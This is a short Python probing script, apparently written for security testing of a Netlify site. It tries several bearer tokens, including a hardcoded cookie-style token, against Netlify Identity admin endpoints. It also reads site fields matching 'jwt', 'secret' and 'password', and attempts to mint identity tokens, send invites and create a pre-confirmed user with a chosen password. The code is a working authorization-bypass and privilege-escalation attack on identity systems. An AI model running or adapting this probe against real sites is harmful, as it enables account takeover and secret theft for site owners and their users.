# -*- coding: utf-8 -*-
# _idn_admin_probe.py - admin API bearer variants + site fields + tokens/invite endpoints
import json, urllib.request, urllib.error
from _net_creds import TOKEN_A, SITE_A

INST = '6a97f260e3e0091b16d132ce'

def req(method, url, body=None, tok=None, ct='application/json'):
    hdrs = {}
    if tok: hdrs['Authorization'] = 'Bearer ' + tok
    data = None
    if body is not None:
        hdrs['Content-Type'] = ct
        data = json.dumps(body).encode() if isinstance(body, (dict, list)) else body.encode()
    r = urllib.request.Request(url, method=method, headers=hdrs, data=data)
    try:
        resp = urllib.request.urlopen(r, timeout=25)
        return resp.status, resp.headers.get('content-type',''), resp.read(2500).decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        return e.code, e.headers.get('content-type',''), e.read(2500).decode('utf-8','replace')
    except Exception as e:
        return 'ERR', '', str(e)[:150]

print('=== A. site-domain GoTrue admin with various bearer tokens ===')
HOST = 'https://sec-test-rcf6lz.netlify.app/.netlify/identity'
for p in ('/admin/users', '/admin/settings', '/user'):
    for tokname, tok in (('PAT', TOKEN_A), ('cookie', 'nfu_usNjRmKU94Ju8XDJx71frhHCvQJakST93b9b')):
        st, ct, b = req('GET', HOST + p, tok=tok)
        print('%-15s %-24s bearer=%s -> %s %s' % (p, tokname, tok[:6], st, b[:150].replace('\n', ' ')))

print()
print('=== B. site full fields (jwt_secret / identity) ===')
st, ct, b = req('GET', 'https://api.netlify.com/api/v1/sites/%s' % SITE_A, tok=TOKEN_A)
try:
    j = json.loads(b)
    for k in sorted(j.keys()):
        if any(s in k.lower() for s in ('identity', 'jwt', 'secret', 'id_domain', 'password')):
            print('  %s = %s' % (k, str(j[k])[:200]))
except Exception as e:
    print('  err', e)

print()
print('=== C. mgmt POST variants (tokens / invite) ===')
base = 'https://api.netlify.com/api/v1/sites/%s/identity/%s' % (SITE_A, INST)
for p, bd in (
    ('/tokens', {}),
    ('/tokens', {'name': 't'}),
    ('/users/invite', {'email': 'zztest-idn-0943@qq.com'}),
    ('/users/invite', {'email': 'zztest-idn-0943@qq.com', 'user_id': 'eda80a6a-92b6-4f2d-98c5-ad71664b6dc6'}),
    ('/users', {'email': 'zztest-idn-0943@qq.com', 'password': 'ZzTest!2345qa', 'email_confirm': True, 'confirmed_at': '2026-09-02T10:00:00Z'}),
):
    st, ct, b = req('POST', base + p, bd, tok=TOKEN_A)
    print('POST %-28s %s -> %s %s' % (p, json.dumps(bd)[:70], st, b[:400].replace('\n', ' ')))
